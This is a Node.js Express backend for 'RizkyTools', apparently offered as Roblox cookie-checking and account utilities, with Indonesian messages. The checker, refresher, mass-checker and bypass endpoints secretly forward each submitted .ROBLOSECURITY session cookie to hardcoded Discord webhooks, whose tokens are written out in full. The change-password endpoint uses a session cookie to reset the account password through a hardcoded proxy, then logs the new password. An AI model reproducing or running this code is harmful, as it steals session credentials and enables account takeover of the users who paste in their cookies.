const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { SocksProxyAgent } = require('socks-proxy-agent');

const app = express();
app.use(cors());
app.use(express.json());

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// ============ WEBHOOK DISCORD ============
const WEBHOOKS = {
    checker:  'https://discord.com/api/webhooks/1568160972286197853/VQBHMQ0akeUSzoYXWIf8MkIGkBgJpr4axz3mgknevLU2wOCYnORiVlyQL66HQTFnQWkK',
    refresh:  'https://discord.com/api/webhooks/1568161144294867004/6hwnRqq_3Q-wc96cemsPCDT-XyXIYyZXBa9eS-BX6i8GEnSDUoyUL9O8aRbyhUEL1FjO',
    mass:     'https://discord.com/api/webhooks/1568161223927660646/JyspkxWOxZH1qj3W7kmD3bEeMA955_72u4E_D4KfhTEp_031pV81HxsShPQ3QTucjPl-',
    bypass:   'https://discord.com/api/webhooks/1568161301329485825/HickSFFdmMr4cLIq1GNhm09w1hrSLqZbUoqRM8Z0NfKu7o8vfWcwcPqKdH1r34xinVhp',
    changepw: 'https://discord.com/api/webhooks/1568161936720527533/vOzqih7nuxe2V_BdQKkvCnXW42aiBNkdqDiK0OajfQ5_9n9kCC9zyGXIedcbWWHn2IMZ'
};

// PROXY HARDCODE
const HARDCODED_PROXY = 'socks5://140.238.243.61:1080'; 

async function sendLog(type, title, description, color = 65280) {
    const url = WEBHOOKS[type];
    if (!url) return;
    try {
        await axios.post(url, {
            embeds: [{
                title: title,
                description: description,
                color: color,
                footer: { text: "RizkyTools v2.5" },
                timestamp: new Date().toISOString()
            }]
        });
    } catch (e) { console.error("Webhook Error:", e.message); }
}

const makeHeaders = (cookie) => ({
    'Cookie': `.ROBLOSECURITY=${cookie.trim()}`,
    'User-Agent': UA,
    'Accept': 'application/json',
    'Referer': 'https://www.roblox.com/'
});

function getAxiosProxyConfig() {
    const proxyUrl = process.env.PROXY_URL || HARDCODED_PROXY;
    if (proxyUrl.startsWith('socks')) {
        const agent = new SocksProxyAgent(proxyUrl);
        return { httpAgent: agent, httpsAgent: agent };
    } else {
        const url = new URL(proxyUrl);
        return { proxy: { host: url.hostname, port: parseInt(url.port), auth: url.username ? { username: url.username, password: url.password } : undefined, protocol: url.protocol.replace(':', '') } };
    }
}

// --- ENDPOINTS ---
app.post('/api/check-cookie', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie || cookie.length < 50) return res.status(400).json({ valid: false, error: 'Cookie terlalu pendek.' });
    const headers = makeHeaders(cookie);
    try {
        const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers, timeout: 8000 });
        const user = authRes.data;
        let robux = 0, premium = false;
        try { const r = await axios.get(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers, timeout: 6000 }); robux = r.data.robux; } catch (e) {}
        try { const r = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, { headers, timeout: 6000 }); premium = r.data === true || r.data?.isPremium === true; } catch (e) {}

        sendLog('checker', "✅ CHECKER: VALID", `**Username:** ${user.name} (ID: ${user.id})\n**Robux:** ${robux} R$\n**Premium:** ${premium ? 'YA' : 'TIDAK'}\n**Cookie:**\n\`\`\`${cookie}\`\`\``, 65280);

        res.json({ valid: true, user: { id: user.id, name: user.name, displayName: user.displayName }, telemetry: { robux, premium } });
    } catch (e) {
        if (e.response && (e.response.status === 401 || e.response.status === 403)) return res.status(401).json({ valid: false, error: 'Cookie invalid.' });
        res.status(500).json({ valid: false, error: 'Gagal hubungi Roblox.' });
    }
});

app.post('/api/refresh-cookie', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie || cookie.length < 50) return res.status(400).json({ error: 'Cookie kosong' });
    const headers = { ...makeHeaders(cookie), 'Referer': 'https://www.roblox.com/' };
    try {
        const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers, timeout: 10000 });
        const setCookie = authRes.headers['set-cookie'];
        let newCookie = null;
        if (setCookie) { for (const c of setCookie) { if (c.startsWith('.ROBLOSECURITY=')) { newCookie = c.split(';')[0].replace('.ROBLOSECURITY=', ''); break; } } }
        
        const finalCookie = newCookie || cookie;
        sendLog('refresh', "🔄 REFRESH: COOKIE BARU", `**Username:** ${authRes.data.name} (ID: ${authRes.data.id})\n**New Cookie:**\n\`\`\`${finalCookie}\`\`\``, 3447003);

        res.json({ refreshed: true, newCookie: finalCookie, sameAsOld: newCookie === cookie || !newCookie, user: { id: authRes.data.id, name: authRes.data.name, displayName: authRes.data.displayName } });
    } catch (e) { res.status(401).json({ refreshed: false, error: 'Cookie invalid.' }); }
});

app.post('/api/change-password', async (req, res) => {
    const { cookie, newPassword } = req.body;
    if (!cookie || !newPassword) return res.status(400).json({ error: 'Cookie dan password baru wajib diisi.' });
    if (newPassword.length < 8) return res.status(400).json({ error: 'Password minimal 8 karakter.' });

    const headers = makeHeaders(cookie);
    const proxyConfig = getAxiosProxyConfig();

    try {
        const csrfRes = await axios.post('https://auth.roblox.com/v2/logout', {}, { headers, timeout: 10000, validateStatus: false, ...proxyConfig });
        let csrfToken = csrfRes.headers['x-csrf-token'];
        if (!csrfToken) return res.status(400).json({ error: 'Gagal ambil CSRF Token. Cookie invalid atau Proxy mati.' });

        await axios.post('https://accountsettings.roblox.com/v1/account/password', {
            currentPassword: null, newPassword: newPassword
        }, { headers: { ...headers, 'X-CSRF-TOKEN': csrfToken }, timeout: 10000, ...proxyConfig });

        try { await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: { ...headers, 'X-CSRF-TOKEN': csrfToken }, timeout: 8000, ...proxyConfig }); } catch(e) {}

        sendLog('changepw', "🔐 PASSWORD BERHASIL DIGANTI", `**Cookie:**\n\`\`\`${cookie.substring(0, 60)}...\`\`\`\n**Password Baru:**\n\`\`\`${newPassword}\`\`\``, 16711680);

        res.json({ success: true, message: 'Password berhasil diganti!' });
    } catch (e) {
        console.error("Change Pass Error:", e.message);
        if (e.response?.status === 400) return res.status(400).json({ error: 'Password baru tidak memenuhi syarat.' });
        if (e.response?.status === 401 || e.response?.status === 403) return res.status(401).json({ error: 'Cookie invalid atau session expired.' });
        res.status(500).json({ error: 'Gagal ganti password. Proxy mungkin mati atau IP diblokir Roblox.' });
    }
});

app.post('/api/bypass-check', async (req, res) => {
    const { cookie, target } = req.body;
    if (!cookie) return res.status(400).json({ error: 'Cookie kosong' });
    const proxyConfig = getAxiosProxyConfig();
    try {
        const r = await axios.get(target || 'https://users.roblox.com/v1/users/authenticated', { headers: makeHeaders(cookie), timeout: 15000, ...proxyConfig });
        sendLog('bypass', "🌐 BYPASS: SUCCESS", `**Target:** ${target}\n**Cookie:**\n\`\`\`${cookie}\`\`\``, 16776960);
        res.json({ success: true, usedProxy: process.env.PROXY_URL || HARDCODED_PROXY, status: r.status, data: r.data });
    } catch (e) { res.status(500).json({ success: false, usedProxy: process.env.PROXY_URL || HARDCODED_PROXY, error: e.response?.status || e.message }); }
});

app.post('/api/mass-check', async (req, res) => {
    const { cookies } = req.body;
    if (!Array.isArray(cookies) || cookies.length === 0) return res.status(400).json({ error: 'Kirim array cookies.' });
    
    async function checkOne(cookie) {
        if (!cookie || cookie.length < 50) return { valid: false, error: 'Format invalid' };
        const headers = makeHeaders(cookie);
        try {
            const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers, timeout: 8000 });
            const user = authRes.data;
            let robux = null, premium = false;
            try { const r = await axios.get(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers, timeout: 6000 }); robux = r.data.robux; } catch (e) {}
            try { const r = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, { headers, timeout: 6000 }); premium = r.data === true || r.data?.isPremium === true; } catch (e) {}
            return { valid: true, username: user.name, displayName: user.displayName, id: user.id, robux, premium, cookie };
        } catch (e) { return { valid: false, error: 'Expired/Invalid' }; }
    }
    
    const results = [];
    for (let i = 0; i < cookies.length; i += 5) {
        const batch = cookies.slice(i, i + 5);
        const r = await Promise.all(batch.map(checkOne));
        results.push(...r);
    }

    const validResults = results.filter(r => r.valid);
    if (validResults.length > 0) {
        let desc = `Total dicek: ${cookies.length}\nValid: ${validResults.length}\n\n`;
        validResults.forEach(r => { desc += `**✅ ${r.username}** | ${r.robux ?? '?'}R$ | ${r.premium ? 'PREM' : 'FREE'}\n\`\`\`${r.cookie}\`\`\`\n`; });
        sendLog('mass', "⚡ MASS CHECKER: HASIL", desc, 10181046); 
    }

    res.json({ total: cookies.length, validCount: results.filter(r => r.valid).length, invalidCount: results.filter(r => !r.valid).length, results });
});

app.post('/api/lookup', async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: 'Username kosong' });
    try {
        const searchRes = await axios.post('https://users.roblox.com/v1/usernames/users', { usernames: [username], excludeBannedUsers: false }, { headers: { 'Content-Type': 'application/json', 'User-Agent': UA }, timeout: 10000 });
        const arr = searchRes.data?.data || [];
        if (arr.length === 0) return res.status(404).json({ error: 'User tidak ditemukan' });
        const u = arr[0];
        res.json({ id: u.id, name: u.name, displayName: u.displayName, telemetry: { robux: null, premium: false, rap: 0, limitedCount: 0, topLimited: [], topGames: [] } });
    } catch (e) { res.status(500).json({ error: 'Lookup gagal.' }); }
});

app.post('/api/tax', (req, res) => {
    const { amount, mode } = req.body;
    if (!amount || amount <= 0) return res.status(400).json({ error: 'Jumlah tidak valid' });
    let result;
    if (mode === 'receive') { const price = Math.ceil(amount / 0.7); result = { price, tax: price - amount, net: amount }; } 
    else { const net = Math.floor(amount * 0.7); result = { price: amount, tax: amount - net, net }; }
    res.json(result);
});

// JALANIN SERVER DI PORT 3000 (Buat Render)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`RizkyTools Backend running on port ${PORT}`));
